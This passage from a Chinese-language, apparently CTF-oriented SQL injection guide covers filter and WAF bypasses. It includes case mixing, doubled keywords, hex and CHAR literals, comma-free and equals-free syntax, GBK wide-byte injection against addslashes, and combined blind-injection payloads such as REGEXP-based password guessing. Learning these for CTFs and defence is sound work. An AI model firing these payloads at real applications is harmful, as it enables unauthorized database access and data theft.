| URL 编码 | `%27`、`%20`、`%0a` | 通用 |
| 二次编码 | `%2527`、`%2520` | WAF 层 |
| Unicode 编码 | `%u0027`（旧 IIS） | 古董 WAF |
| HTML 实体 | `&#39;` | 后端先做 HTML 解码的场景 |

#### 第 5 步：选型逻辑——看到过滤先归类再出招
| 过滤表现 | 可能实现 | 首选绕过 |
| --- | --- | --- |
| 小写关键字被拦，混大小写能过 | 正则区分大小写 | 大小写混淆 |
| 关键字被替换成空（去掉后能拼回原词） | str_replace 一次 | 双写 |
| 带引号的字符串被拦 | 过滤引号/转义 | hex / CHAR 拼接 |
| 带空格的 payload 被拦 | 过滤空格 | 注释/控制字符/括号 |
| 页面 403 / 拦截页（非 SQL 报错） | WAF 层正则 | 二次编码 / 换行拆分 |

先跑一两个对照实验定位到上表某一行，再针对性打，比随机换 payload 快一个数量级。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 大小写混淆无效 | 过滤正则加了 `i` 标志，不区分大小写 | 换双写或 hex |
| 双写后还报错 | 过滤是递归替换，或双写没对准被过滤的词 | 确认过滤名单里到底有哪个词 |
| `0x...` 报语法错 | 不在 MySQL 环境（PG/MSSQL 不认） | 用 CHAR 拼接或 `E'\x...'`（PG） |
| `%2527` 无效 | 应用层只解码一次，二次编码后拿不到引号 | 退回单次 URL 编码，或确认应用解码次数 |
| 所有编码都过不去 | 过滤发生在参数化之前或基于语义分析 | 考虑换注入点 / 换打法（盲注、堆叠） |

#### 实战要点
- 三个招式对应三种过滤实现：区分大小写→混淆；替换成空→双写；拦字符串→hex。先归类再出招。
- hex 编码顺带解决了"引号被过滤"的难题，是 MySQL 场景最实用的招。
- 双写 + 注释拆分 + 空格替代可以任意组合，一套 payload 打多层过滤。
- 计算 hex 用工具别手算：`echo -n flag | xxd -p`、`'flag'.encode().hex()` 都行。
- 牢记 hex 是 MySQL 专属：跨库时 PG 用 `E'\x...'`、MSSQL 用 `CHAR(102)+CHAR(108)+...`。
- WAF 拦截（403）和代码过滤（SQL 报错）是两码事，先分清再选绕过层。

### [bypass-quote] 引号、逗号、等号绕过与宽字节 | hard | 引号;逗号;宽字节;GBK | -
> 过滤引号用 hex/无引号写法，过滤逗号用 join/offset 替代，等号用 LIKE/REGEXP 替代，宽字节则专打 GBK 转义，本条目给出全套替代写法。

#### 这个条目的作用
黑名单进阶版会连**符号**一起过滤：`'`、`,`、`=` 都被列入黑名单。符号不像关键字能靠大小写绕，必须用**语法等价物**替代。本条目是符号绕过全集：引号怎么绕（hex、CHAR、无引号写法）、逗号怎么绕（FROM...FOR、OFFSET、OR）、等号怎么绕（LIKE、REGEXP、BETWEEN），最后是杀手锏宽字节注入——利用 GBK 编码吞掉转义反斜杠，让 `addslashes` 形同虚设。

#### 前置条件
- 已确认过滤的是具体符号（如 `'` 被替换/拦截、`,` 报错）。
- 知道目标库类型（hex 只在 MySQL 有效，CHAR 拼接各库写法不同）。
- 宽字节注入还需要：目标使用 GBK 系字符集 + 后端用了 `addslashes`/`mysql_real_escape_string` 这类转义。

#### 第 1 步：引号绕过——字符串不带引号怎么写
过滤 `'` 后，字符串常量必须换写法。三个方案按库选择：

```sql
-- 方案 1：hex 字面量（仅 MySQL）—— 0x61646d696e = 'admin'
?id=1' AND username=0x61646d696e --+

-- 方案 2：CHAR() 逐字符拼接（MSSQL 用 + 连接）
?id=1' AND username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110) --+
-- MySQL 里 CHAR 拼接用 CONCAT：CONCAT(CHAR(97),CHAR(100),...)

-- 方案 3：无引号字面量（数字/十六进制直接写）
?id=1' AND id=0x31 --+        -- 0x31 = '1'（数字型比较，常用于数字型注入点）
```

> [!warn]
> MSSQL 的 `0x...` 是二进制不是字符串，`username=0x61646d696e` 在 MSSQL 会类型不匹配报错，必须用 CHAR 拼接或 `NCHAR` 系列。

#### 第 2 步：逗号绕过——SUBSTR / LIMIT / IN 全替代
过滤 `,` 会同时废掉 `SUBSTR(a,b,c)`、`LIMIT 0,1`、`IN ('a','b')`。各有等价写法：

```sql
-- SUBSTR(a,b,c) 无逗号版：FROM pos FOR len
AND SUBSTR(DATABASE() FROM 1 FOR 1)='c'
AND MID(DATABASE() FROM 1 FOR 1)='c'     -- MID 同样支持

-- LIMIT 0,1 无逗号版：LIMIT 1 OFFSET 0
UNION SELECT 1,2,3 LIMIT 1 OFFSET 0

-- IN 列表无逗号版：OR 展开
WHERE username IN ('a','b')  →  WHERE username='a' OR username='b'

-- JOIN 代替多表逗号（FROM a,b → FROM a JOIN b）
SELECT * FROM users u JOIN orders o ON u.id=o.uid
```

逗号绕过是"函数签名重排"的典型：`SUBSTR(str,pos,len)` 的三个参数用关键字 `FROM`/`FOR` 就能无逗号表达，这是最常考的一个。

#### 第 3 步：等号绕过——比较不一定要 `=`
过滤 `=` 后，比较运算还有一大票替代：

```sql
-- LIKE：前缀/包含匹配
AND username LIKE 'admin'
AND username LIKE 'adm%'

-- REGEXP：正则匹配，可以当"逐字符盲注"的利器
AND username REGEXP '^adm'
AND (SELECT ... ) REGEXP '^f'          -- 猜数据首字符是不是 f

-- BETWEEN：区间比较（配合 ASCII 盲注）
AND ASCII(SUBSTR(DATABASE(),1,1)) BETWEEN 96 AND 100

-- IN / 大于小于：数值比较
AND id IN (1)
AND id > 0 AND id < 2
```

REGEXP 在盲注里特别值钱：`AND (SELECT password FROM users LIMIT 1) REGEXP '^a'` 能逐字符猜，且完全避开 `=` 和 `LIKE` 的过滤名单。

#### 第 4 步：理解宽字节注入原理——GBK 吞掉反斜杠
这是**编码层面**的经典漏洞。先看正常流程：

```txt
用户输入：'           （单引号）
addslashes 转义：\'   （变成 %5c%27，反斜杠+引号）
SQL 执行：...WHERE name='\'...'    → 引号被转义，注入失败
```

但若连接字符集是 GBK，`%5c%27`（反斜杠+引号）中 `%bf%5c` 会被 MySQL **当作一个合法的 GBK 双字节字符**（"縗"）解析，剩下的 `%27` 就是**裸单引号**：

```txt
输入 %bf%27
转义后 %bf%5c%27
GBK 解析：%bf%5c 合并成"縗"（一个字符）→ 剩 %27 是裸引号 → 注入成立
```

关键点：**反斜杠被"吃"进了前一个字节，没起到转义作用**。

#### 第 5 步：宽字节注入实战 payload
满足"GBK 字符集 + addslashes 类转义"后，直接打：

```sql
-- 单引号被转义也不怕：%bf%27 绕过转义
?id=%bf%27 UNION SELECT 1,2,3 --+

-- 组合：配合 hex 绕引号过滤（此时连 %27 都不用）
?id=%bf%27 AND username=0x61646d696e --+
```

适用条件核对：

| 条件 | 检查方法 |
| --- | --- |
| 字符集是 GBK 系 | 响应头 `Content-Type: charset=gbk`、`SET NAMES gbk`、题目提示 |
| 后端用了转义函数 | addslashes / mysql_real_escape_string / magic_quotes |
| 前后端字符集一致 | 不一致时解码链路断裂 |

> [!danger]
> UTF-8 下宽字节注入**必然失败**：UTF-8 的 `%bf` 不会和 `%5c` 组成合法字符，反斜杠正常转义。先确认字符集再上这招，别浪费时间。

#### 第 6 步：组合攻击——多种符号过滤一起绕
实战里过滤常常是"引号+逗号+等号+关键字"全上，此时把前面的招全叠起来：

```sql
-- 过滤：' , = union select 空格
-- 打法：hex（绕引号）+ REGEXP（绕等号）+ FROM...FOR（绕逗号）+ 注释（绕空格）+ 双写（绕关键字）
?id=1/**/AND/**/username/**/REGEXP/**/0x61646d --+          -- 猜 admin 前缀
?id=1/**/AND/**/ASCII(SUBSTR(DATABASE()/**/FROM/**/1/**/FOR/**/1))/**/BETWEEN/**/96/**/AND/**/100 --+
```

从"最外层动作"（猜一个字符）倒推需要的符号，逐个换成等价写法，最后整条 payload 里不该出现的符号一个都没有。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `0x...` 比较报类型错误 | 在 MSSQL/PG 用了 MySQL 的 hex 字面量 | MSSQL 用 CHAR 拼接，PG 用 `E'\x...'` |
| 宽字节注入完全无效 | 字符集不是 GBK（UTF-8 下 %bf 吞不掉反斜杠） | 先确认 `SET NAMES gbk` / 响应头 charset |
| `FROM 1 FOR 1` 语法错 | 某些库/版本不支持该无逗号写法 | MySQL 用 `MID(str FROM a FOR b)`，其他库考虑别的手段 |
| REGEXP 报错 | 目标不是 MySQL（PG/MSSQL 正则语法不同） | PG 用 `~`、MSSQL 用 LIKE，先认库 |
| 等号替换后语义反了 | `BETWEEN 96 AND 100` 的边界理解错 | 明确开闭区间：BETWEEN 包含两端 |
| 宽字节 + 转义后仍失败 | 转义函数是 `mysql_real_escape_string` 且字符集已设为 utf8 | 该函数在 utf8 下安全，换其他绕过思路 |

#### 实战要点
- 引号过滤三选一：MySQL 用 hex、MSSQL 用 CHAR 拼接、PG 用 `E'\x...'`——先认库再选。
- 逗号过滤记住两个重排：`SUBSTR(a FROM b FOR c)` 和 `LIMIT n OFFSET m`，CTF 最爱考。
- 等号过滤最实用的是 REGEXP，因为它能当盲注逐字符猜数据的通道。
- 宽字节注入是"编码层"漏洞，前提是 GBK 字符集 + 转义函数，UTF-8 下直接放弃这招。
- 多层符号过滤 = 多层替代叠加，写 payload 时从动作倒推符号，逐个替换。
- 所有绕过招式都以"语义不变"为原则：替换后 SQL 执行结果必须与原始 payload 完全一致，写完在本地 MySQL 里验证一遍再打靶。
